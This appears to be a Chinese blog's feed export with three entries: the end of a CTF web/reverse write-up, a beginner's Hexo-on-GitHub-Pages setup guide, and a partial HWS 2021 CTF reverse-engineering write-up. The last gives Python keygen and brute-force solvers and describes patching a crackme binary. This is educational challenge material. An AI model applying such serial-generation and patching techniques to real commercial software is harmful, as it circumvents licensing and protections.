class="number">0xf</span>]))) &#123;</span><br><span class="line">            _0x5197x5(_0x5197x6)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">        _0x5197x5(_0x5197x6)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)(&#123;&#125;)</span><br></pre></td></tr></table></figure><p>就得到了flag：<strong>flag{this_game_is_funny!}</strong></p>]]></content>
      
      
      <categories>
          
          <category> Write up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Reverse </tag>
            
            <tag> wp </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>如何从无到有搭建属于你的hexo博客</title>
      <link href="p/blogsFor-Enjoying-hexo/"/>
      <url>p/blogsFor-Enjoying-hexo/</url>
      
        <content type="html"><![CDATA[<p>文如标题，如何利用从无到有搭建属于你的hexo博客，完全面向小白的喂饭式指南。</p><p>其实这类入门指南网上一搜一大把，这就是我一开始没有边装边记录的原因（可能就跟别的文章完全一致了），现在用了一段hexo以后顺带整合一些技巧，这篇Blog最重要的原因还是给网络部的小伙伴们备课吧。</p><p>一边备课一边水Blog，计划通hhhh。</p><a id="more"></a><p>2021.03亲测有效，环境是VMware+win10(ver. 20H2)，因为物理机上已经装过了，所以用虚拟机重新走一遍流程。</p><p>安利一下自己的hexo博客：<a href="https://c10udlnk.top/">r3ver5e^4^fuuuuun | c10udlnk_Log</a></p><p>顺便，如果有用hexo搭建博客的小伙伴想生成自己博客的年度报告，指路：<a href="https://github.com/c10udlnk/hexo-T1meM4chine">c10udlnk&#x2F;hexo-T1meM4chine: 为你的hexo博客生成年度数据报告！</a>，目前还只是一个雏形，没灵感不太想往后搞（咕咕咕），等下次心血来潮的时候再把TO DO给填了吧。以及，测试样本太少估计会有一大堆bug（。</p><blockquote><p>本文参考链接：</p><ul><li>梦开始的地方：<a href="https://www.yuque.com/0xffff.one/cs-learning/blog-building">开始搭建你的第一个博客 · 语雀</a> &#x2F; <a href="https://0xffff.one/d/544">搭建一个自己的博客 - 0xFFFF</a></li><li>踩坑路上结合参考的：<a href="https://zhuanlan.zhihu.com/p/60578464">使用 Hexo+GitHub 搭建个人免费博客教程（小白向） - 知乎</a></li></ul></blockquote><p><strong>P.S. 本文算是整合型教程，某些内容会跟参考链接一模一样（不过图片是自截图）。</strong></p><p><strong>P.S.S 本文只讲步骤不讲原理，原理请看课程ppt。</strong></p><h1 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>可以在powershell中先用以下命令检验是否安装相应环境</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$</span> git -<span class="literal">-version</span></span><br><span class="line"><span class="variable">$</span> node -<span class="literal">-version</span></span><br><span class="line"><span class="variable">$</span> npm -<span class="literal">-version</span></span><br></pre></td></tr></table></figure><h3 id="git"><a href="#git" class="headerlink" title="git"></a>git</h3><p>打开<a href="https://git-scm.com/">Git</a>官网 -&gt; Downloads -&gt; Windows，稍等片刻后会开始下载。</p><p><img src="/p/blogsFor-Enjoying-hexo/image-20210306105747101.png"></p><p><img src="/p/blogsFor-Enjoying-hexo/image-20210306105833299.png"></p><p>文件下载完成后，双击打开下载的<code>Git-2.30.1-64-bit.exe</code>。</p><p>然后一路next，到这一步的时候改一下选项，从vim改到notepad（记事本）：</p><p><img src="/p/blogsFor-Enjoying-hexo/image-20210306110546410.png"></p><p><img src="/p/blogsFor-Enjoying-hexo/image-20210306110608136.png"></p><p>然后一路Next下去就好，等待安装完成。</p><p><img src="/p/blogsFor-Enjoying-hexo/image-20210306110843962.png"></p><p>然后在powershell中输入<code>git --version</code>会看到：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$</span> git -<span class="literal">-version</span></span><br><span class="line">git version <span class="number">2.30</span>.<span class="number">1</span>.windows.<span class="number">1</span></span><br></pre></td></tr></table></figure><p>只要能看到版本号即为安装成功。</p><h3 id="Node-js"><a href="#Node-js" class="headerlink" title="Node.js"></a>Node.js</h3><p>打开<a href="https://nodejs.org/zh-cn/">Node.js</a>官网-&gt;下载</p><p><img src="/p/blogsFor-Enjoying-hexo/image-20210306112308421.png"></p><p>同样是双击<code>node-v14.16.0-x64.msi</code>文件后一路next，到这里打个勾。</p><p><img src="/p/blogsFor-Enjoying-hexo/image-20210306113225554.png"></p><p>然后等待安装完成。</p><p><img src="/p/blogsFor-Enjoying-hexo/image-20210306113241693.png"></p><p>然后在powershell中输入<code>node --version</code>和<code>npm --version</code>会看到：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$</span> node -<span class="literal">-version</span></span><br><span class="line">v14.<span class="number">16.0</span></span><br><span class="line"><span class="variable">$</span> npm -<span class="literal">-version</span></span><br><span class="line"><span class="number">6.14</span>.<span class="number">11</span></span><br></pre></td></tr></table></figure><p>只要能看到版本号即为安装成功。</p><h2 id="GitHub相关"><a href="#GitHub相关" class="headerlink" title="GitHub相关"></a>GitHub相关</h2><h3 id="注册GitHub"><a href="#注册GitHub" class="headerlink" title="注册GitHub"></a>注册GitHub</h3><p><del>不会吧不会吧居然还有人没有GitHub账号吗（误</del></p><p>真的没有的话可以按照这个<a href="https://www.cnblogs.com/cxq0017/p/9636083.html">GitHub从注册到使用 - evilsnake - 博客园</a>来注册，走到<strong>建库</strong>之前那步就好。</p><h3 id="创建Github-Pages仓库"><a href="#创建Github-Pages仓库" class="headerlink" title="创建Github Pages仓库"></a>创建Github Pages仓库</h3><p>这里因为<code>@c10udlnk</code>的账号下已经有这样的仓库了，故以下用小号<code>@Glowstone-jojo</code>进行演示。</p><p><del>（算法号已经沦落为小号了</del></p><p>点右上角的“+” -&gt; New repository来新建仓库。</p><p><img src="/p/blogsFor-Enjoying-hexo/image-20210306125428871.png"></p><p><img src="/p/blogsFor-Enjoying-hexo/image-20210306145522672.png"></p><p><img src="/p/blogsFor-Enjoying-hexo/image-20210306145720666.png"></p><h3 id="连接GitHub"><a href="#连接GitHub" class="headerlink" title="连接GitHub"></a>连接GitHub</h3><p>在桌面右键 -&gt; Git Bash Here</p><p><img src="/p/blogsFor-Enjoying-hexo/image-20210313084429201.png"></p><p>然后在小黑框里输入：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$</span> git config -<span class="literal">-global</span> user.name <span class="string">&quot;用户名&quot;</span></span><br><span class="line"><span class="variable">$</span> git config -<span class="literal">-global</span> user.email <span class="string">&quot;邮箱&quot;</span></span><br></pre></td></tr></table></figure><p>（这里的用户名和邮箱不一定是你注册Github的用户名和邮箱，随意起就好）。</p><p>输入以下语句查看设置是否成功：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$</span> git config user.name</span><br><span class="line"><span class="variable">$</span> git config user.email</span><br></pre></td></tr></table></figure><p>输入以下语句生成SSH key：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$</span> ssh<span class="literal">-keygen</span> <span class="literal">-t</span> rsa <span class="literal">-C</span> <span class="string">&quot;邮箱&quot;</span></span><br></pre></td></tr></table></figure><p>然后连敲三次回车（全部设置默认）</p><p>会出现这样的文字：</p><p><img src="/p/blogsFor-Enjoying-hexo/image-20210313093103816.png"></p><p>打开蓝色框框起来的路径</p><p><img src="/p/blogsFor-Enjoying-hexo/image-20210313093636025.png"></p><p>用记事本打开id_rsa.pub，并复制里面的内容</p><p><img src="/p/blogsFor-Enjoying-hexo/image-20210313093841957.png"></p><p>在Github中转入Settings界面，SSH and GPG keys -&gt; New SSH key</p><p><img src="/p/blogsFor-Enjoying-hexo/image-20210313095349158.png"></p><p><img src="/p/blogsFor-Enjoying-hexo/image-20210313095510533.png"></p><p>按如下填写</p><p><img src="/p/blogsFor-Enjoying-hexo/image-20210313095828929.png"></p><p>然后点Add SSH key，稍等片刻就能看到。</p><p><img src="/p/blogsFor-Enjoying-hexo/image-20210313101043349.png"></p><p>说明添加成功。</p><p>在Git Bash中输入以下语句来验证：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$</span> ssh <span class="literal">-T</span> git@github.com</span><br></pre></td></tr></table></figure><p>并在交互时打上yes，会看到</p><p><img src="/p/blogsFor-Enjoying-hexo/image-20210313101326479.png"></p><p>即为连接成功。</p><h2 id="安装hexo"><a href="#安装hexo" class="headerlink" title="安装hexo"></a>安装hexo</h2><p>创建一个文件夹以存放你的博客数据，名字随意，在这里用<code>shift+右键</code>，点击“在此处打开PowerShell”。</p><p><img src="/p/blogsFor-Enjoying-hexo/image-20210313101943180.png"></p><p>输入以下语句来在全局下安装hexo。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$</span> npm install <span class="literal">-g</span> hexo<span class="literal">-cli</span></span><br></pre></td></tr></table></figure><p>先输入</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$</span> <span class="built_in">Set-ExecutionPolicy</span> <span class="literal">-Scope</span> CurrentUser</span><br></pre></td></tr></table></figure><p>在交互中分别输入<code>remotesigned</code>和<code>y</code>来更改执行策略，不然无法执行脚本文件。</p><p><img src="/p/blogsFor-Enjoying-hexo/image-20210502114603612.png"></p><p>然后输入以下语句对此文件夹进行hexo的初始化</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$</span> hexo init</span><br><span class="line"><span class="variable">$</span> npm install</span><br></pre></td></tr></table></figure><p>然后依次使用以下语句进行测试</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$</span> hexo g</span><br><span class="line"><span class="variable">$</span> hexo s</span><br></pre></td></tr></table></figure><p><img src="/p/blogsFor-Enjoying-hexo/image-20210313103255050.png"></p><p>在浏览器中打开<code>http://localhost:4000</code>即可看到：</p><p><img src="/p/blogsFor-Enjoying-hexo/image-20210313103311498.png"></p><h2 id="部署到GitHub-Pages"><a href="#部署到GitHub-Pages" class="headerlink" title="部署到GitHub Pages"></a>部署到GitHub Pages</h2><p>输入</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$</span> npm install hexo<span class="literal">-deployer</span><span class="literal">-git</span> -<span class="literal">-save</span></span><br></pre></td></tr></table></figure><p>来安装hexo-deployer-git。</p><p>然后修改<code>_config.yml</code>末尾的Deployment部分</p><p><img src="/p/blogsFor-Enjoying-hexo/image-20210313105907319.png"></p><p>改为</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">deploy:</span></span><br><span class="line">  <span class="attr">type:</span> <span class="string">git</span></span><br><span class="line">  <span class="attr">repository:</span> <span class="string">git@github.com:GitHub用户名/GitHub用户名.github.io.git</span></span><br><span class="line">  <span class="attr">branch:</span> <span class="string">main</span></span><br></pre></td></tr></table></figure><p>例如我的改为：</p><p><img src="/p/blogsFor-Enjoying-hexo/image-20210313113045197.png"></p><blockquote><p>P.S. 这里的main是我们的默认分支名。</p></blockquote><p>然后在powershell中输入</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$</span> hexo d</span><br></pre></td></tr></table></figure><p>最后浏览器访问<code>https://用户名.github.io</code>即可看到博客页面。</p><p><img src="/p/blogsFor-Enjoying-hexo/image-20210313114028459.png"></p><h2 id="安装一款markdown编辑器"><a href="#安装一款markdown编辑器" class="headerlink" title="安装一款markdown编辑器"></a>安装一款markdown编辑器</h2><p>这里我推荐<a href="https://www.typora.io/">Typora</a>，点击Download，选择平台版本（一般是Windows 64位）即可下载。</p><p><del>别问，问就是这是我见过最好的md编辑器了</del></p><p><img src="/p/blogsFor-Enjoying-hexo/image-20210313114745520.png"></p><p><img src="/p/blogsFor-Enjoying-hexo/image-20210313114901183.png"></p><p><img src="/p/blogsFor-Enjoying-hexo/image-20210313114926525.png"></p><p>双击<code>typora-setup-x64.exe</code>开始安装，也是一路next就好。</p><p><img src="/p/blogsFor-Enjoying-hexo/image-20210313115242692.png"></p><h1 id="开始使用"><a href="#开始使用" class="headerlink" title="开始使用"></a>开始使用</h1><h2 id="新建文章"><a href="#新建文章" class="headerlink" title="新建文章"></a>新建文章</h2><p>输入以下语句新建文章</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$</span> hexo new <span class="string">&quot;文章url&quot;</span></span><br></pre></td></tr></table></figure><p>注意，这里双引号内是文章的url，建议用简洁直观+容易解析+一般url（如使用英文和<code>-</code>连字符）的字符串，不然如果里面用到了<code>&amp;</code>之类的保留字(?)就会引起某些奇怪的bug（比如某度sitemap抓不到）。</p><p>e.g. 这篇文章的url在蓝色框处，红色框处为文章标题，将在下一part提到。</p><p><img src="/p/blogsFor-Enjoying-hexo/image-20210313145652124.png"></p><p>比如我输入<code>hexo new &quot;testBlog&quot;</code>，就会在这里看到<code>testBlog.md</code>。</p><p><img src="/p/blogsFor-Enjoying-hexo/image-20210313123354651.png"></p><p>双击打开即可编辑。</p><p>在编辑完成后，使用</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo clean ; hexo g <span class="literal">-d</span></span><br></pre></td></tr></table></figure><p>来进行博客的全局更新。</p><p><strong>注意：仅使用<code>hexo g -d</code>进行差分修改可以提高generate的效率，推荐日常使用。不过有时候部署到本地(<code>hexo s</code>)可以但远程(<code>hexo d</code>)不行的时候，试试<code>hexo clean ; hexo g -d</code>会有奇效。</strong></p><h2 id="yml-front"><a href="#yml-front" class="headerlink" title="yml front"></a>yml front</h2><p>打开<code>testBlog.md</code>可以看到：</p><p><img src="/p/blogsFor-Enjoying-hexo/image-20210313124151041.png"></p><p>其中蓝框处就是我这里所说的yml front（yaml格式）。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">title:</span> <span class="string">testBlog</span> <span class="comment">#上一part提到的文章标题</span></span><br><span class="line"><span class="attr">date:</span> <span class="number">2021-03-13 12:32:25</span> <span class="comment">#日期</span></span><br><span class="line"><span class="attr">tags:</span> <span class="comment">#使用tag标记文章，用“ - tag”来标注</span></span><br></pre></td></tr></table></figure><p>我们可以通过把title处的<code>testBlog</code>改成任意文章标题，就像上一part中的红框处。</p><p>需要注意的是，yaml中语法结构为<code>key: value</code>，冒号后面<strong>一定要加一个空格</strong>！不然该行yaml无效！</p><p>使用<code>&lt;!-- more --&gt;</code>来手动分隔摘要和内容，例如：</p><p><img src="/p/blogsFor-Enjoying-hexo/image-20210313130409330.png"></p><p>那么最后生成的结果为：</p><p><img src="/p/blogsFor-Enjoying-hexo/image-20210313130334585.png"></p><p><img src="/p/blogsFor-Enjoying-hexo/image-20210313130346934.png"></p><h2 id="Markdown和LaTeX"><a href="#Markdown和LaTeX" class="headerlink" title="Markdown和LaTeX"></a>Markdown和LaTeX</h2><p>蓝色框下面的就是文章内容。</p><p><code>.md</code>文件是通过Markdown语法来写文章的，用起来十分方便，网上有很多这样的教程，比如-&gt;<a href="https://www.runoob.com/markdown/md-tutorial.html">Markdown 教程 | 菜鸟教程</a>。</p><p>常用的大概是：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="emphasis">_斜体_</span></span><br><span class="line"></span><br><span class="line"><span class="strong">**加粗**</span></span><br><span class="line"></span><br><span class="line">[<span class="string">url标题</span>](<span class="link">www.xxxx.com</span>)</span><br><span class="line"></span><br><span class="line">![<span class="string">图片</span>](<span class="link">图片地址</span>)</span><br><span class="line"></span><br><span class="line"><span class="code">`单行代码`</span></span><br><span class="line"></span><br><span class="line">​<span class="code">```python</span></span><br><span class="line"><span class="code">多行代码</span></span><br><span class="line"><span class="code">​```</span></span><br><span class="line"></span><br><span class="line">$公式，比如x<span class="emphasis">_i^2+y_</span>i=\frac&#123;\partial X&#125;&#123;\partial u&#125;$</span><br><span class="line"></span><br><span class="line">各级标题：</span><br><span class="line"><span class="section"># 一级标题</span></span><br><span class="line"><span class="section">## 二级标题</span></span><br><span class="line"><span class="section">### 三级标题</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure><h2 id="优雅地在博客中插入图片"><a href="#优雅地在博客中插入图片" class="headerlink" title="优雅地在博客中插入图片"></a>优雅地在博客中插入图片</h2><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">![<span class="string">图片</span>](<span class="link">图片地址</span>)</span><br></pre></td></tr></table></figure><p>尽管Markdown可以这么加入图片，但图片地址只能填图链地址，万一图床平台挂了又得补就十分麻烦。</p><p>联想到博客中的页面实际上也是存在一个仓库中，那么我们可以通过用本地的相对地址来添加图片的方法，这里感谢<a href="https://www.cnblogs.com/cocowool/p/hexo-image-link.html">Hexo博客写作与图片处理的经验 - Cocowool - 博客园</a>提供的思路，踩坑无数以后看到这篇真的完美解决问题TvT。</p><p>修改hexo配置文件<code>_config.yml</code>，让hexo在new的时候自动生成一个跟url相同的文件夹：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">post_asset_folder:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure><p>可以看到新new的文章就有了这个文件夹：</p><p><img src="/p/blogsFor-Enjoying-hexo/image-20210313142409123.png"></p><p>然后在Typora的偏好设置 -&gt; 图像里调整，把插入图片时的选项设置为“复制到指定路径”，默认就是跟文件名同名的文件夹中，刚好适配asset folder。</p><p><img src="/p/blogsFor-Enjoying-hexo/image-20210313142642074.png"></p><p><img src="/p/blogsFor-Enjoying-hexo/image-20210313142810916.png"></p><p>并且保证这里前三个勾都打上了。</p><p><img src="/p/blogsFor-Enjoying-hexo/image-20210313144037433.png"></p><p>然后在powershell中用以下语句安装插件hexo-image-link</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$</span> npm install hexo<span class="literal">-image</span><span class="literal">-link</span> -<span class="literal">-save</span></span><br></pre></td></tr></table></figure><p>配置完成，开始测试。</p><p>在测试文章中粘贴图片进行测试：</p><p><img src="/p/blogsFor-Enjoying-hexo/image-20210313144127752.png"></p><p>成果：</p><p><img src="/p/blogsFor-Enjoying-hexo/image-20210313144505594.png"></p><h1 id="进阶设置"><a href="#进阶设置" class="headerlink" title="进阶设置"></a>进阶设置</h1><p>关于进阶设置，这里不再赘述，直接指路前人的教程。</p><ul><li><p>网站设置：<a href="https://hexo.io/zh-cn/docs/configuration">配置 | Hexo</a></p></li><li><p>更换主题（比如Melody）：<a href="https://blog.csdn.net/weixin_38378684/article/details/92830472">使用 hexo+melody 主题搭建个人博客_王某人的博客-CSDN博客</a></p><p>P.S. 主题更推荐<a href="https://butterfly.js.org/">Butterfly</a>，由Melody魔改，而且现在还在持续维护（不用开荒555）。</p></li><li><p>添加live2d：<a href="https://c10udlnk.top/p/blogsFor-My-twisty-experience-on-Live2d/">我的自定义多交互live2d折腾经历 | c10udlnk_Log</a></p></li><li><p>Melody主题添加代码雨特效：<a href="https://c10udlnk.top/p/blogsFor-hexo-addingDigitalRainInMelody/">Melody主题的背景代码雨特效 | c10udlnk_Log</a></p></li><li><p>绑定域名：（2021.4亲测教程，绑定腾讯云域名）<a href="https://m0d1.top/2021/04/21/bind-domainname-forhexo/">【从0到1】为github.io博客绑定（企鹅）域名 | M0D1 and Morty</a></p></li><li><p>SEO抓取优化：<a href="https://rapiz.me/2020/blog-seo/">Hexo SEO 之完全指北 | 潮与雪 - Rapiz</a></p></li><li><p>Melody主题在Slides上的bug修复和魔改系列：<a href=""></a></p></li><li><p>……</p></li></ul><p>总之祝大家能愉快地使用自己搭建的博客来记录啦~ 0v0</p>]]></content>
      
      
      <categories>
          
          <category> Others </category>
          
      </categories>
      
      
        <tags>
            
            <tag> zero2one/入门 </tag>
            
            <tag> u5eful </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【wp】HWS计划2021硬件安全冬令营线上选拔赛</title>
      <link href="p/wpFor-2021HWSTrial/"/>
      <url>p/wpFor-2021HWSTrial/</url>
      
        <content type="html"><![CDATA[<p>逆向手在夹缝中艰难求生系列。</p><p>这篇真的存粹是做题笔记了，对内核驱动啥的不太懂，pwn也不会，能做出来的题都是硬逆出来的（</p><p>childre最后死活没整出来，后来看大佬的wp才知道对子进程有修改(。)呜呜呜多进程真的不太会啊。</p><a id="more"></a><h1 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h1><h2 id="obfu"><a href="#obfu" class="headerlink" title="obfu"></a>obfu</h2><p>一堆密码堆起来的题（密码菜鸡卑微落泪</p><p>按逻辑来说拿到serial number就能拿到flag了。</p><p>通过findcrypt找到三个加密算法的常量，通过交叉引用确定函数用途。</p><p><img src="/p/wpFor-2021HWSTrial/image-20210201105545648.png"></p><p><img src="/p/wpFor-2021HWSTrial/image-20210201110812839.png"></p><p>v10和v8相比之下v8更容易出，v8跟输入没有关系，相当于已知字符串（&#x3D;md5(“admin”)。</p><p>然后就是enctrpy函数。</p><p><img src="/p/wpFor-2021HWSTrial/image-20210201125645536.png"></p><p>按照顺序是AES_enc-&gt;RC4_dec-&gt;循环左移三位复原。</p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES,ARC4</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256,md5</span><br><span class="line"></span><br><span class="line">v8=unhexlify(md5(<span class="string">&quot;admin&quot;</span>).hexdigest())</span><br><span class="line">admin=[<span class="built_in">ord</span>(x) <span class="keyword">for</span> x <span class="keyword">in</span> unhexlify(sha256(<span class="string">&quot;admin&quot;</span>).hexdigest())]</span><br><span class="line">tmp=<span class="string">&quot;&quot;</span>+<span class="built_in">chr</span>(admin[<span class="number">0</span>])</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">32</span>):</span><br><span class="line">    tmp+=<span class="built_in">chr</span>(admin[i]^admin[i<span class="number">-1</span>])</span><br><span class="line">key=tmp[:<span class="number">16</span>]</span><br><span class="line">iv=tmp[<span class="number">16</span>:]</span><br><span class="line">aes=AES.new(key,AES.MODE_CBC,iv)</span><br><span class="line">cipher=aes.encrypt(v8)</span><br><span class="line">rc4=ARC4.new(key)</span><br><span class="line">input_enc=rc4.decrypt(cipher)</span><br><span class="line">tmps=<span class="built_in">bin</span>(<span class="built_in">int</span>(hexlify(input_enc),<span class="number">16</span>))[<span class="number">2</span>:].rjust(<span class="number">16</span>*<span class="number">8</span>,<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">tmps=tmps[<span class="number">3</span>:]+tmps[:<span class="number">3</span>]</span><br><span class="line">serial=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">    serial+=<span class="built_in">hex</span>(<span class="built_in">int</span>(tmps[i*<span class="number">8</span>:i*<span class="number">8</span>+<span class="number">8</span>],<span class="number">2</span>))[<span class="number">2</span>:].rjust(<span class="number">2</span>,<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">print(serial)</span><br></pre></td></tr></table></figure><p>拿到serial：653b987431e5a2fc7c3d748fba008869</p><p><img src="/p/wpFor-2021HWSTrial/image-20210201125415385.png"></p><p>最后拿到flag：<strong>0725f66471f85ba9d742eb583c75959c</strong></p><h2 id="decryption"><a href="#decryption" class="headerlink" title="decryption"></a>decryption</h2><p>送！分！题！泪目了呜呜呜呜呜</p><p>加密函数在这里：</p><p><img src="/p/wpFor-2021HWSTrial/image-20210201104136351.png"></p><p>懒得逆逻辑了，直接copy算法爆破（毕竟是按字节加密hhh。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">arr=[<span class="number">0x12</span>, <span class="number">0x45</span>, <span class="number">0x10</span>, <span class="number">0x47</span>, <span class="number">0x19</span>, <span class="number">0x49</span>, <span class="number">0x49</span>, <span class="number">0x49</span>, <span class="number">0x1A</span>, <span class="number">0x4F</span>, <span class="number">0x1C</span>, <span class="number">0x1E</span>, <span class="number">0x52</span>, <span class="number">0x66</span>, <span class="number">0x1D</span>, <span class="number">0x52</span>, <span class="number">0x66</span>, <span class="number">0x67</span>, <span class="number">0x68</span>, <span class="number">0x67</span>, <span class="number">0x65</span>, <span class="number">0x6F</span>, <span class="number">0x5F</span>, <span class="number">0x59</span>, <span class="number">0x58</span>, <span class="number">0x5E</span>, <span class="number">0x6D</span>, <span class="number">0x70</span>, <span class="number">0xA1</span>, <span class="number">0x6E</span>, <span class="number">0x70</span>, <span class="number">0xA3</span>]</span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">        v5=j</span><br><span class="line">        v4=i </span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            v3=<span class="number">2</span>*(v4&amp;v5)</span><br><span class="line">            v5^=v4</span><br><span class="line">            v4=v3</span><br><span class="line">            <span class="keyword">if</span> v3==<span class="number">0</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> v5^<span class="number">0x23</span>==arr[i]:</span><br><span class="line">            flag+=<span class="built_in">chr</span>(j)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><p><strong>flag：1e1a6edc1c52e80b539127fccd48f05a</strong></p><h2 id="babyre"><a href="#babyre" class="headerlink" title="babyre"></a>babyre</h2><p><img src="/p/wpFor-2021HWSTrial/image-20210201091622464.png"></p><p>乍一看主函数逻辑很简单，实际上如果不patch的话是不可能完成的（byte_41A808这里有不可见字符。</p><blockquote><p>看到这篇wp（<a href="https://blog.csdn.net/qq_37439229/article/details/113507064">HWS计划2021硬件安全冬令营线上选拔赛 re wp_20000s的博客-CSDN博客</a>）里说是“内部加载dll，hook了驱动”，好像是这样，不过为啥动态调试的时候没有hook到呢（tcl不懂，选择手动hook</p></blockquote><p>然后注意到了2047这个奇怪的数字，正常来说ZwLoadDriver应该是不会返回这种东西的（吧，所以从左边函数表一个一个翻下来找到了关键函数sub_412A20()</p><p><img src="/p/wpFor-2021HWSTrial/image-20210201092003012.png"></p><p>结合前面v9的赋值可以猜测，应该调用这个函数，并且a2是v9，才能对输入的Str调用v4进行加密得到byte_41A808。</p><p>所以先直接暴力patch</p><p><img src="/p/wpFor-2021HWSTrial/image-20210201092245011.png"></p><p><img src="/p/wpFor-2021HWSTrial/image-20210201092306597.png"></p><p>然后下断点，动态调试，可以看到v4实际上是：</p><p><img 